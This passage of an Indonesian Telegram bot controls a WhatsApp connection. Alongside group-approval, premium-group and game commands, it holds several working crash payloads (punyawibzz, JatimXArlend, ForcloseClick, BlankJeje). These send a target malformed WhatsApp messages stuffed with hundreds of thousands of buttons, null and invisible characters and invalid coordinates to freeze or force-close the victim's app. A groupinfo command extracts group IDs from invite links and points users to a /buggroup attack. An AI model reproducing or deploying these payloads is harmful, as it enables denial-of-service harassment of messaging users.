          fileSha256: "2eqLffA9IMphTt+iMq8k5QrWjpXajm8ZqJA9kk5JbDg=",
          fileLength: 9999,
          height: 9999,
          width: 9999,
          mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
          fileEncSha256: "aGfmY0rHUSe1eBmt1vkewywDKjUmnRjng3DfLhUMYAc=",
          directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1776937541",
          jpegThumbnail: null,
          caption: "sumsel",
          scansSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
          scanLengths: [
            9999999999999999999,
            9999999999999999999,
            9999999999999999999,
            9999999999999999999
          ],
          midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0="
        },
        hasMediaAttachment: true
      },
      body: {
        text: "¿ xx-xx ?"
      },
      nativeFlowMessage: {
        buttons: Array.from({ length: 500000 }, () => ({}))
      }
    }
  }, {});

  await sock.relayMessage(target, msg, {});
  await sock.relayMessage(target, msg2, {});
  await sock.relayMessage(target, msg3, {});
}

//------------------(FUNGSI PUNYA WIBZZ - NEWSLETTER)--------------------//
async function punyawibzz(sock, target) {
  const msg = {
    groupStatusMessageV2: {
      message: {
        newsletterAdminInviteMessage: {
          newsletterJid: '12345678@newsletter',
          newsletterName: 'hallo aku wibzz' + 'ោ៝'.repeat(7500),
          caption: 'Xrahse wibzz st' + 'ោ៝'.repeat(7500),
          inviteExpiration: Date.now() + 1814400000,
          contextInfo: {
            participant: target,
            mentionedJid: [
              '0@s.whatsapp.net',
              ...Array.from({ length: 1900 }, () =>
                '1' + Math.floor(Math.random() * 5000000) + '@s.whatsapp.net'
              )
            ],
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 3,
                expiryTimestamp: Date.now() + 1814400000
              },
              forwardedAiBotMessageInfo: {
                number_999999: "DATA_MEDIA",
                botName: 'olaa hanz',
                botJid: Math.floor(Math.random() * 5000000) + '@s.whatsapp.net',
                creatorName: 'hanzback',
                liveLocationMessage: {
                  degreesLatitude: -1e309,
                  degreesLongitude: 1e309,
                  accuracyInMeters: 999999999,
                  speedInMps: 1,
                  degreesClockwiseFromMagneticNorth: 999999999,
                  caption: "\u0000".repeat(50000),
                  sequenceNumber: 999999999,
                  timeOffset: Date.now()
                }
              }
            }
          }
        }
      }
    }
  };
  await sock.relayMessage(target, msg, {});
}

//------------------(FUNGSI JATIM X ARLEND - DELAY INVIS)--------------------//
async function JatimXArlend(sock, target) {
  try {
    const lend = {
      groupStatusMessageV2: {
        message: {
          interactiveMessage: {
            body: {
              text: "Jatim" + "\n" 
            },
            nativeFlowMessage: {
              messageParamsJson: "[".repeat(50000),
              buttons: Array.from({ length: 50000 }, () => ({}))
            }
          }
        }
      }
    };

    const vnf = {
      protocolMessage: {
        type: 9999,
        key: {
          remoteJid: "status@broadcast",
          fromMe: false,
          id: "\u0000".repeat(70000) + "\u600b".repeat(60000)
        },
        message: "\u200B".repeat(100000) + "\u0000".repeat(100000),
        timestamp: Math.floor(Date.now() / 1000)
      }
    };

    const jatim = {
      groupStatusMessageV2: {
        message: {
          interactiveMessage: {
            body: {
              text: "VnF"
            },
            nativeFlowMessage: {
              buttons: Array.from({ length: 500000 }, () => ({}))
            },
            contextInfo: {
              quotedMessage: {
                stickerPackMessage: {}
              }
            }
          }
        }
      }
    };

    await sock.relayMessage(target, lend, { noSelfSync: true });
    await sock.relayMessage(target, vnf, { noSelfSync: true });
    await sock.relayMessage(target, jatim, { noSelfSync: true });

    console.log(`✅ Sukses Send To: ${target}`);
  } catch (err) {
    console.error(`❌ Error: ${err.message}`);
  }
}

//------------------(FUNGSI FOR CLOSE CLICK)--------------------//
async function ForcloseClick(sock, target) {   
  const msg1 = {
    botForwardedMessage: {
      message: {
        richResponseMessage: {
          messageType: 1,
          submessages: [{
            messageType: 8,
            latexMetadata: {
              text: "assalamualaikum",
              expressions: [{
                latexExpression: "assalamualaikum",
                url: "https://t.me/jeje_offcial",
                fontHeight: 9999999
              }]
            }
          }],
          contextInfo: {
            forwardingScore: 99999,
            isForwarded: true,
            forwardedAiBotMessageInfo: {
              botJid: "867051314767696@bot"
            },
            forwardOrigin: 4
          }
        }
      }
    }
  };
  await sock.relayMessage(target, msg1, {
    participant: { jid: target }
  });
}
//------------------(FUNGSI BLANK JEJE - DEBUG)--------------------//
async function BlankJeje(sock, target) {
  const jid = target.includes('@s.whatsapp.net') ? target : target + '@s.whatsapp.net';
  console.log(`[BlankJeje] ▶️ Memulai untuk ${jid}`);

  const msg = {
    interactiveMessage: {
      header: {
        title: "Jeje Offcial",
        subtitle: "Jeje Offcial",
        hasMediaAttachment: true,
        locationMessage: {
          degreesLatitude: -98.6289790,
          degreesLongitude: 89.9821647,
          name: "Jeje Offcial",
          address: "Jeje Offcial"
        }
      },
      body: {
        text: "Jeje Offcial"
      },
      footer: {
        text: "Jeje Offcial"
      },
      nativeFlowMessage: {
        buttons: [
          {
            name: "single_select",
            buttonParamsJson: "{}"
          },
          {
            name: "cta_url",
            buttonParamsJson: JSON.stringify({
              display_text: "Jeje Offcial" + "ꦾ" + "\u200B" + "ြ" + "\uA9BD".repeat(250000),
              url: "https://t.me/jeje_offcial"
            })
          }
        ],
        messageParamsJson: "{}"
      }
    }
  };

  try {
    console.log(`[BlankJeje] 📤 Mengirim pesan pertama...`);
    await sock.relayMessage(jid, msg, {}); // ❌ HAPUS participant
    console.log(`[BlankJeje] ✅ Pesan pertama terkirim (status: OK)`);
  } catch (err) {
    console.error(`[BlankJeje] ❌ Gagal pesan pertama:`, err.message);
  }

  const msg1 = {
    interactiveMessage: {
      body: {
        text: "JEJEXX"
      },
      nativeFlowMessage: {
        buttons: Array.from({ length: 500000 }, () => ({
          buttonId: "\u0000".repeat(1000),
          buttonText: {
            displayText: "JEJE OFFCIAL" + "\0" + "\x10".repeat(1000)
          }
        })),
        messageParamsJson: "{}"
      },
      contextInfo: {
        forwardingScore: 99999,
        isForwarded: true,
        forwardedAiBotMessageInfo: {
          botJid: "867051314767696@bot"
        },
        mentionedJid: ["0@s.whatsapp.net"],
        forwardOrigin: 4
      }
    }
  };

  try {
    console.log(`[BlankJeje] 📤 Mengirim pesan kedua (500k tombol)...`);
    await sock.relayMessage(jid, msg1, {}); // ❌ HAPUS participant
    console.log(`[BlankJeje] ✅ Pesan kedua terkirim (status: OK)`);
  } catch (err) {
    console.error(`[BlankJeje] ❌ Gagal pesan kedua:`, err.message);
  }

  console.log(`[BlankJeje] 🏁 Selesai untuk ${jid}`);
}
//------------------(AKHIR OF FUNCTION)--------------------//
bot.command("approved", async (ctx) => {
  if (!isOwner(ctx.from.id)) {
    return ctx.reply("❌ Hanya owner yang bisa approve group.");
  }

  const args = ctx.message.text.split(" ").slice(1);
  const chatId = args[0];

  if (!chatId) {
    return ctx.reply("🪧 Format: /approved -100xxxxxxxxxx");
  }

  if (isGroupApproved(chatId)) {
    return ctx.reply("⚠️ Group ini sudah di-approve.");
  }

  approvedGroups.push(String(chatId));
  saveApprovedGroups();

  if (pendingGroups.has(String(chatId))) {
    clearTimeout(pendingGroups.get(String(chatId)).timeout);
    pendingGroups.delete(String(chatId));
  }

  try {
    await ctx.telegram.sendMessage(
      chatId,
      "✅ Group ini telah di-approve oleh owner. Bot sekarang aktif di sini."
    );
  } catch (e) {}

  return ctx.reply(`✅ Group ${chatId} berhasil di-approve.`);
});

bot.command("unapproved", async (ctx) => {
  if (!isOwner(ctx.from.id)) {
    return ctx.reply("❌ Hanya owner yang bisa mencabut approve.");
  }

  const args = ctx.message.text.split(" ").slice(1);
  const chatId = args[0];

  if (!chatId) {
    return ctx.reply("🪧 Format: /unapproved -100xxxxxxxxxx");
  }

  if (!isGroupApproved(chatId)) {
    return ctx.reply("⚠️ Group ini belum di-approve.");
  }

  approvedGroups = approvedGroups.filter((id) => id !== String(chatId));
  saveApprovedGroups();

  try {
    await ctx.telegram.sendMessage(
      chatId,
      "⚠️ Approval group ini dicabut oleh owner. Bot akan nonaktif di sini."
    );
  } catch (e) {}

  return ctx.reply(`✅ Approval group ${chatId} berhasil dicabut.`);
});

bot.command("listapprovedgroup", async (ctx) => {
  if (!isOwner(ctx.from.id)) {
    return ctx.reply("❌ Hanya owner yang bisa melihat daftar.");
  }

  if (approvedGroups.length === 0) {
    return ctx.reply("📭 Belum ada group yang di-approve.");
  }

  const text = approvedGroups.map((id, i) => `${i + 1}. ${id}`).join("\n");
  return ctx.reply(`📋 Daftar group approved:\n\n${text}`);
});

bot.command("blockcmd", async (ctx) => {
  if (String(ctx.from.id) !== String(ownerID)) {
    return ctx.reply("❌ Akses ditolak.");
  }

  const args = ctx.message.text.split(" ").slice(1);
  const commandName = normalizeCommandName(args[0]);

  if (!commandName) {
    return ctx.reply("🪧 Format: /blockcmd namacommand");
  }

  if (["blockcmd", "unblockcmd", "listblockcmd"].includes(commandName)) {
    return ctx.reply("❌ Command ini tidak bisa diblokir.");
  }

  if (blockedCommands.includes(commandName)) {
    return ctx.reply(`⚠️ Command /${commandName} sudah diblokir.`);
  }

  blockedCommands.push(commandName);
  saveBlockedCommands();

  return ctx.reply(`✅ Command /${commandName} berhasil diblokir.`);
});

bot.command("unblockcmd", async (ctx) => {
  if (String(ctx.from.id) !== String(ownerID)) {
    return ctx.reply("❌ Akses ditolak.");
  }

  const args = ctx.message.text.split(" ").slice(1);
  const commandName = normalizeCommandName(args[0]);

  if (!commandName) {
    return ctx.reply("🪧 Format: /unblockcmd namacommand");
  }

  if (!blockedCommands.includes(commandName)) {
    return ctx.reply(`⚠️ Command /${commandName} tidak sedang diblokir.`);
  }

  blockedCommands = blockedCommands.filter(cmd => cmd !== commandName);
  saveBlockedCommands();

  return ctx.reply(`✅ Command /${commandName} berhasil dibuka kembali.`);
});

bot.command("listblockcmd", async (ctx) => {
  if (String(ctx.from.id) !== String(ownerID)) {
    return ctx.reply("❌ Akses ditolak.");
  }

  if (blockedCommands.length === 0) {
    return ctx.reply("✅ Tidak ada command yang sedang diblokir.");
  }

  const list = blockedCommands.map((cmd, i) => `${i + 1}. /${cmd}`).join("\n");

  return ctx.reply(
    `📋 Daftar command yang diblokir:\n\n${list}`
  );
});

// ================================
// COMMAND: ADD PREMIUM GROUP
// /addpremgrup
// ================================
bot.command("addpremgrup", ownerOnly(), async (ctx) => {
  const type = ctx.chat?.type;
  if (type === "private") return ctx.reply("❌ Pakai command ini di grup.");

  addPremGroup(ctx.chat.id);

  const title = escapeHtml(ctx.chat?.title || "Unknown Group");
  return ctx.reply(
    `✅ ☇ <b>${title}</b> berhasil ditambahkan sebagai Group premium`,
    { parse_mode: "HTML" }
  );
});

// ================================
// COMMAND: DELETE PREMIUM GROUP
// /delpremgrup
// ================================
bot.command("delpremgrup", ownerOnly(), async (ctx) => {
  const type = ctx.chat?.type;
  if (type === "private") return ctx.reply("❌ Pakai command ini di grup.");

  delPremGroup(ctx.chat.id);

  const title = escapeHtml(ctx.chat?.title || "Unknown Group");
  return ctx.reply(
    `🗑 ☇ <b>${title}</b> berhasil dihapus sebagai group premium sampai`,
    { parse_mode: "HTML" }
  );
});

// ================================
// COMMAND: LIST PREMIUM GROUP
// /listpremgrup
// ================================
bot.command("listpremgrup", ownerOnly(), async (ctx) => {
  const db = loadPremGroups();
  if (!db.groups.length) return ctx.reply("📭 Tidak ada grup premium.");

  const lines = db.groups.map((id, i) => `${i + 1}. <code>${id}</code>`).join("\n");
  return ctx.reply(`📌 <b>LIST GRUP PREMIUM</b>\n\n${lines}`, { parse_mode: "HTML" });
});

// ================================
// COMMAND: /ttt
// ================================
bot.command("ttt", async (ctx) => {
  if (!ctx.chat || (ctx.chat.type !== "group" && ctx.chat.type !== "supergroup")) {
    return ctx.reply("❌ Game ini hanya bisa dimainkan di grup.");
  }

  const chatId = ctx.chat.id;

  if (tttGames.has(chatId)) {
    return ctx.reply("⚠️ Sudah ada game Tic Tac Toe yang berjalan di grup ini.");
  }

  const gameId = Date.now().toString().slice(-6);

  const game = {
    id: gameId,
    board: tttNewBoard(),
    players: {
      X: ctx.from,
      O: null
    },
    turn: "X",
    messageId: null,
    started: false
  };

  tttGames.set(chatId, game);

  const sent = await ctx.reply( `<blockquote>
🎮 𝐓𝐈𝐂 𝐓𝐀𝐂 𝐓𝐎𝐄 𝐆𝐀𝐌𝐄 🎮

❌ X : <b>${tttSafeName(ctx.from)}</b>
⭕ O : <b>Belum join</b>

<i>Klik tombol di bawah untuk join sebagai O</i>
</blockquote>`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "⭕ Join Game", callback_data: `tttjoin_${chatId}_${gameId}` }]
        ]
      }
    }
  );

  game.messageId = sent.message_id;
});

// ================================
// COMMAND: /tttstop
// ================================
bot.command("tttstop", async (ctx) => {
  const chatId = ctx.chat.id;

  if (!tttGames.has(chatId)) {
    return ctx.reply("❌ Tidak ada game Tic Tac Toe yang sedang berjalan.");
  }

  tttGames.delete(chatId);
  return ctx.reply("🛑 Game Tic Tac Toe dihentikan.");
});

// ================================
// COMMAND: /mypoint
// ================================
bot.command("mypoint", async (ctx) => {
  const row = getUserPoint(ctx.from.id);
  if (!row) {
    return ctx.reply("📌 Kamu belum punya point.");
  }

  return ctx.reply( `<blockquote>
🏅 𝐌𝐘 𝐏𝐎𝐈𝐍𝐓 🏅

👤 <b>${row.name}</b>
⭐ Point: <b>${row.points}</b>

🏆 Win: <b>${row.win}</b>
🤝 Draw: <b>${row.draw}</b>
💀 Lose: <b>${row.lose}</b>
</blockquote>`,
    { parse_mode: "HTML" }
  );
});

// ================================
// COMMAND: /leaderboard
// ================================
bot.command("leaderboard", async (ctx) => {
  const top = getLeaderboard(10);

  if (!top.length) {
    return ctx.reply("📌 Leaderboard masih kosong.");
  }

  let text = `🏆 <b>LEADERBOARD TIC TAC TOE</b>\n\n`;
  top.forEach((u, i) => {
    text += `${i + 1}. <b>${u.name}</b> — ⭐ <b>${u.points}</b> (W:${u.win} D:${u.draw} L:${u.lose})\n`;
  });

  return ctx.reply(text, { parse_mode: "HTML" });
});

// ================================
// JOIN GAME
// ================================
bot.action(/^tttjoin_(.+)_(.+)$/, async (ctx) => {
  try {
    const chatId = Number(ctx.match[1]);
    const gameId = String(ctx.match[2]);
    const game = tttGames.get(chatId);

    if (!game || game.id !== gameId) {
      return ctx.answerCbQuery("❌ Game tidak ditemukan", { show_alert: true });
    }

    if (game.players.O) {
      return ctx.answerCbQuery("⚠️ Slot O sudah diisi", { show_alert: true });
    }

    if (game.players.X.id === ctx.from.id) {
      return ctx.answerCbQuery("❌ Kamu sudah jadi player X", { show_alert: true });
    }

    game.players.O = ctx.from;
    game.started = true;

    await ctx.editMessageText(tttRender(game), {
      parse_mode: "HTML",
      reply_markup: tttBoardKeyboard(chatId, gameId, game.board)
    });

    return ctx.answerCbQuery("✅ Kamu join sebagai O");
  } catch {
    return ctx.answerCbQuery("❌ Error");
  }
});

// ================================
// MOVE
// ================================
bot.action(/^tttmove_(.+)_(.+)_(\d+)$/, async (ctx) => {
  try {
    const chatId = Number(ctx.match[1]);
    const gameId = String(ctx.match[2]);
    const index = Number(ctx.match[3]);

    const game = tttGames.get(chatId);
    if (!game || game.id !== gameId) {
      return ctx.answerCbQuery("❌ Game tidak ditemukan", { show_alert: true });
    }

    if (!game.started) {
      return ctx.answerCbQuery("⚠️ Game belum dimulai", { show_alert: true });
    }

    const currentPlayer = game.turn === "X" ? game.players.X : game.players.O;
    if (!currentPlayer || currentPlayer.id !== ctx.from.id) {
      return ctx.answerCbQuery("❌ Bukan giliran kamu", { show_alert: true });
    }

    if (game.board[index] !== null) {
      return ctx.answerCbQuery("⚠️ Kotak ini sudah terisi", { show_alert: true });
    }

    game.board[index] = game.turn;

    const winner = tttWinner(game.board);

    if (winner) {
      const winnerUser = winner === "X" ? game.players.X : game.players.O;
      const loserUser = winner === "X" ? game.players.O : game.players.X;

      addWinPoint(winnerUser);
      addLosePoint(loserUser);

      await ctx.editMessageText( `<blockquote>
🏆 𝐓𝐈𝐂 𝐓𝐀𝐂 𝐓𝐎𝐄 𝐒𝐄𝐋𝐄𝐒𝐀𝐈 🏆

<i>🏅 Pemenang:</i>
<b>${tttSafeName(winnerUser)}</b> (${winner})

⭐ +3 point untuk pemenang
</blockquote>`,
        {
          parse_mode: "HTML",
          reply_markup: tttBoardKeyboard(chatId, gameId, game.board, true)
        }
      );

      tttGames.delete(chatId);
      return ctx.answerCbQuery("🏆 Menang!");
    }

    if (tttDraw(game.board)) {
      addDrawPoint(game.players.X);
      addDrawPoint(game.players.O);

      await ctx.editMessageText( `<blockquote>
🤝 𝐓𝐈𝐂 𝐓𝐀𝐂 𝐓𝐎𝐄 𝐒𝐄𝐋𝐄𝐒𝐀𝐈 🤝

<i>📜 Hasil:</i>
<b>SERI</b>

⭐ +1 point untuk kedua pemain
</blockquote>`,
        {
          parse_mode: "HTML",
          reply_markup: tttBoardKeyboard(chatId, gameId, game.board, true)
        }
      );

      tttGames.delete(chatId);
      return ctx.answerCbQuery("🤝 Seri");
    }

    game.turn = game.turn === "X" ? "O" : "X";

    await ctx.editMessageText(tttRender(game), {
      parse_mode: "HTML",
      reply_markup: tttBoardKeyboard(chatId, gameId, game.board)
    });

    return ctx.answerCbQuery("✅ Langkah diterima");
  } catch {
    return ctx.answerCbQuery("❌ Error");
  }
});

// ================================
// NOOP
// ================================
bot.action(/^tttnoop_(.+)_(.+)$/, async (ctx) => {
  return ctx.answerCbQuery("⚠️ Game sudah selesai");
});

// ================================
// /suit
// ================================
bot.command("suit", async (ctx) => {
  if (!ctx.chat || (ctx.chat.type !== "group" && ctx.chat.type !== "supergroup")) {
    return ctx.reply("❌ Game ini hanya bisa dimainkan di grup.");
  }

  const chatId = ctx.chat.id;

  if (suitGames.has(chatId)) {
    return ctx.reply("⚠️ Sudah ada game Suit yang berjalan di grup ini.");
  }

  const gameId = Date.now().toString().slice(-6);

  const game = {
    id: gameId,
    p1: ctx.from,
    p2: null,
    p1Choice: null,
    p2Choice: null,
    started: false,
    messageId: null
  };

  suitGames.set(chatId, game);

  const sent = await ctx.reply( `<blockquote>
🎮 𝐒𝐔𝐈𝐓 𝐏𝐕𝐏 𝐆𝐀𝐌𝐄 🎮

👤 Player 1: <b>${suitName(ctx.from)}</b>
👤 Player 2: <b>Belum join</b>

<i>Klik tombol di bawah untuk join game.</i>
</blockquote>`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "⚔️ Join Suit", callback_data: `suitjoin_${chatId}_${gameId}` }]
        ]
      }
    }
  );

  game.messageId = sent.message_id;
});

// ================================
// /suitstop
// ================================
bot.command("suitstop", async (ctx) => {
  const chatId = ctx.chat.id;

  if (!suitGames.has(chatId)) {
    return ctx.reply("❌ Tidak ada game Suit yang berjalan.");
  }

  suitGames.delete(chatId);
  return ctx.reply("🛑 Game Suit dibatalkan.");
});

// ================================
// JOIN
// ================================
bot.action(/^suitjoin_(.+)_(.+)$/, async (ctx) => {
  try {
    const chatId = Number(ctx.match[1]);
    const gameId = String(ctx.match[2]);
    const game = suitGames.get(chatId);

    if (!game || game.id !== gameId) {
      return ctx.answerCbQuery("❌ Game tidak ditemukan", { show_alert: true });
    }

    if (game.p2) {
      return ctx.answerCbQuery("⚠️ Player 2 sudah ada", { show_alert: true });
    }

    if (game.p1.id === ctx.from.id) {
      return ctx.answerCbQuery("❌ Kamu sudah jadi player 1", { show_alert: true });
    }

    game.p2 = ctx.from;
    game.started = true;

    await ctx.editMessageText( `<blockquote>
🎮 𝐒𝐔𝐈𝐓 𝐏𝐕𝐏 𝐆𝐀𝐌𝐄 🎮

👤 Player 1: <b>${suitName(game.p1)}</b>
👤 Player 2: <b>${suitName(game.p2)}</b>

Silakan masing-masing pilih:
<i>(klik tombol, pilihan hanya terlihat oleh sistem)</i>
</blockquote>`,
      {
        parse_mode: "HTML",
        reply_markup: suitPickKeyboard(chatId, gameId)
      }
    );

    return ctx.answerCbQuery("✅ Kamu join sebagai player 2");
  } catch {
    return ctx.answerCbQuery("❌ Error");
  }
});

// ================================
// PICK
// ================================
bot.action(/^suitpick_(.+)_(.+)_(rock|paper|scissors)$/, async (ctx) => {
  try {
    const chatId = Number(ctx.match[1]);
    const gameId = String(ctx.match[2]);
    const choice = String(ctx.match[3]);

    const game = suitGames.get(chatId);
    if (!game || game.id !== gameId) {
      return ctx.answerCbQuery("❌ Game tidak ditemukan", { show_alert: true });
    }

    if (!game.started || !game.p2) {
      return ctx.answerCbQuery("⚠️ Game belum siap", { show_alert: true });
    }

    if (ctx.from.id === game.p1.id) {
      if (game.p1Choice) return ctx.answerCbQuery("⚠️ Kamu sudah memilih", { show_alert: true });
      game.p1Choice = choice;
      await ctx.answerCbQuery(`✅ Pilihan kamu: ${suitChoiceLabel(choice)}`, { show_alert: true });
    } else if (ctx.from.id === game.p2.id) {
      if (game.p2Choice) return ctx.answerCbQuery("⚠️ Kamu sudah memilih", { show_alert: true });
      game.p2Choice = choice;
      await ctx.answerCbQuery(`✅ Pilihan kamu: ${suitChoiceLabel(choice)}`, { show_alert: true });
    } else {
      return ctx.answerCbQuery("❌ Kamu bukan player game ini", { show_alert: true });
    }

    if (!game.p1Choice || !game.p2Choice) {
      const p1Done = game.p1Choice ? "✅" : "⌛";
      const p2Done = game.p2Choice ? "✅" : "⌛";

      await ctx.editMessageText( `<blockquote>
🎮 𝐒𝐔𝐈𝐓 𝐏𝐕𝐏 𝐆𝐀𝐌𝐄 🎮

👤 ${suitName(game.p1)} ${p1Done}
👤 ${suitName(game.p2)} ${p2Done}

<i>Menunggu kedua pemain memilih...</i>
</blockquote>`,
        {
          parse_mode: "HTML",
          reply_markup: suitPickKeyboard(chatId, gameId)
        }
      ).catch(() => {});

      return;
    }

    // hasil
    const result = suitWin(game.p1Choice, game.p2Choice);

    if (result === "draw") {
      addSuitDraw(game.p1);
      addSuitDraw(game.p2);

      await ctx.editMessageText( `<blockquote>
🤝 𝐒𝐔𝐈𝐓 𝐒𝐄𝐋𝐄𝐒𝐀𝐈 🤝

👤 ${suitName(game.p1)} = ${suitChoiceLabel(game.p1Choice)}
👤 ${suitName(game.p2)} = ${suitChoiceLabel(game.p2Choice)}

Hasil: <b>SERI</b>
</blockquote>`,
        { parse_mode: "HTML" }
      );

      suitGames.delete(chatId);
      return;
    }

    const winner = result === "p1" ? game.p1 : game.p2;
    const loser = result === "p1" ? game.p2 : game.p1;

    addSuitWin(winner);
    addSuitLose(loser);

    await ctx.editMessageText( `<blockquote>
🏆 𝐒𝐔𝐈𝐓 𝐒𝐄𝐋𝐄𝐒𝐀𝐈 🏆

👤 ${suitName(game.p1)} = ${suitChoiceLabel(game.p1Choice)}
👤 ${suitName(game.p2)} = ${suitChoiceLabel(game.p2Choice)}

<i>Pemenang:</i>
<b>${suitName(winner)}</b>

⭐ +2 point
</blockquote>`,
      { parse_mode: "HTML" }
    );

    suitGames.delete(chatId);
  } catch {
    return ctx.answerCbQuery("❌ Error");
  }
});

//---------(DETEKSI BOT JOIN GB ) ---------//
bot.on("my_chat_member", async (ctx) => {
  try {
    const update = ctx.update.my_chat_member;
    const newStatus = update.new_chat_member.status;
    const oldStatus = update.old_chat_member.status;
    const chat = update.chat;

    const isGroup = chat.type === "group" || chat.type === "supergroup";
    if (!isGroup) return;

    const chatId = String(chat.id);
    const chatTitle = chat.title || "Tanpa Nama";

    // bot baru masuk / diundang ke group
    const joinedStatuses = ["member", "administrator"];
    const oldLeftStatuses = ["left", "kicked"];

    if (joinedStatuses.includes(newStatus) && oldLeftStatuses.includes(oldStatus)) {
      if (isGroupApproved(chatId)) return;

      await ctx.telegram.sendMessage(
        chat.id,
        "⚠️ Bot masuk ke group ini tapi belum di-approve owner.\n\nJika dalam 10 menit tidak di-approve, bot akan keluar otomatis."
      );

      // notif ke owner
      await ctx.telegram.sendMessage(
        ownerID,
        `🚨 BOT DITAMBAHKAN KE GROUP BARU\n\n` +
        `Nama Group: ${chatTitle}\n` +
        `Chat ID: ${chatId}\n\n` +
        `Gunakan:\n` +
        `/approved ${chatId}\n\n` +
        `Jika ingin mengizinkan bot aktif di group tersebut.`
      );

      // simpan pending + timer 10 menit
      if (pendingGroups.has(chatId)) {
        clearTimeout(pendingGroups.get(chatId).timeout);
      }

      const timeout = setTimeout(async () => {
        try {
          if (!isGroupApproved(chatId)) {
            await ctx.telegram.sendMessage(
              chat.id,
              "❌ Group tidak di-approve dalam 10 menit. Bot keluar otomatis."
            );
            await ctx.telegram.leaveChat(chat.id);
          }
        } catch (e) {
          console.error("Gagal leave group:", e.message);
        } finally {
          pendingGroups.delete(chatId);
        }
      }, 10 * 60 * 1000);

      pendingGroups.set(chatId, {
        title: chatTitle,
        timeout
      });
    }
  } catch (err) {
    console.error("Error my_chat_member:", err.message);
  }
});

bot.command("getgroupjid", async (ctx) => {
  if (!sock) return ctx.reply("❌ WhatsApp belum terhubung.");
  try {
    const groups = await sock.groupFetchAllParticipating();
    let text = "📋 **Daftar JID Grup:**\n\n";
    for (const [jid, data] of Object.entries(groups)) {
      text += `📌 ${data.subject}\n\`${jid}\`\n\n`;
    }
    ctx.reply(text, { parse_mode: "Markdown" });
  } catch (e) {
    ctx.reply(`❌ Gagal: ${e.message}`);
  }
});

//------------------(COMMAND GET GROUP INFO FROM INVITE - FIX)--------------------//
bot.command("groupinfo", async (ctx) => {
  if (!sock) return ctx.reply("❌ WhatsApp belum terhubung.");
  
  const args = ctx.message.text.split(" ");
  if (!args[1]) return ctx.reply("📌 Format: /groupinfo https://chat.whatsapp.com/xxxxx");
  
  // Ekstrak kode undangan dari URL
  let inviteCode = args[1];
  if (inviteCode.includes("chat.whatsapp.com/")) {
    inviteCode = inviteCode.split("chat.whatsapp.com/")[1].split("?")[0];
  }
  
  try {
    // Metode 1: Coba dengan query standar
    const result = await sock.query({
      tag: 'iq',
      attrs: { 
        type: 'get', 
        xmlns: 'w:g2', 
        to: 'g.us' 
      },
      content: [{ 
        tag: 'invite', 
        attrs: { 
          code: inviteCode 
        } 
      }]
    });
    
    const inviteNode = result?.content?.[0];
    if (!inviteNode) return ctx.reply("❌ Gagal mendapatkan info grup. Mungkin link tidak valid.");
    
    // Ambil semua atribut yang mungkin berisi JID
    const attrs = inviteNode.attrs || {};
    let groupJid = attrs.jid || attrs.id || attrs.group || null;
    
    // Jika JID tidak ditemukan, coba cari di dalam node child
    if (!groupJid && inviteNode.content) {
      for (const child of inviteNode.content) {
        if (child.attrs?.jid) {
          groupJid = child.attrs.jid;
          break;
        }
      }
    }
    
    const groupName = attrs.subject || attrs.name || "Tidak diketahui";
    const participantCount = attrs.participants || attrs.size || "Tidak diketahui";
    
    let text = `📋 **Info Grup dari Undangan:**\n\n`;
    text += `📌 Nama: ${groupName}\n`;
    if (groupJid) {
      text += `🆔 JID: \`${groupJid}\`\n`;
    } else {
      text += `⚠️ JID tidak dapat ditemukan secara otomatis.\n`;
      text += `💡 Silakan gabung ke grup terlebih dahulu dengan:\n`;
      text += `/joingroup ${inviteCode}\n`;
      text += `Lalu jalankan /getgroupjid untuk melihat JID.\n`;
    }
    text += `👥 Anggota: ${participantCount}\n`;
    text += `🔗 Kode: ${inviteCode}\n\n`;
    if (groupJid) {
      text += `⚠️ Untuk menyerang grup, gunakan:\n`;
      text += `/buggroup ${groupJid}`;
    } else {
      text += `⚠️ Untuk menyerang, gunakan JID setelah bergabung.`;
    }
    
    ctx.reply(text, { parse_mode: "Markdown" });
    
  } catch (e) {
    ctx.reply(`❌ Gagal: ${e.message}\n\nPastikan link undangan valid dan bot tidak diblokir.`);
  }
});

//------------------(COMMAND JOIN GROUP FROM INVITE)--------------------//
bot.command("joingroup", async (ctx) => {
  if (!sock) return ctx.reply("❌ WhatsApp belum terhubung.");
  
  const args = ctx.message.text.split(" ");
  if (!args[1]) return ctx.reply("📌 Format: /joingroup https://chat.whatsapp.com/xxxxx");
  
  // Ekstrak kode undangan dari URL
  let inviteCode = args[1];
  if (inviteCode.includes("chat.whatsapp.com/")) {
    inviteCode = inviteCode.split("chat.whatsapp.com/")[1].split("?")[0];
  }
  
  try {
    // Bergabung ke grup menggunakan kode undangan
    const result = await sock.groupAcceptInvite(inviteCode);
    ctx.reply(`✅ Berhasil bergabung ke grup!\n🆔 JID: \`${result}\``, { parse_mode: "Markdown" });
  } catch (e) {
    ctx.reply(`❌ Gagal bergabung: ${e.message}`);
  }
});


bot.launch()
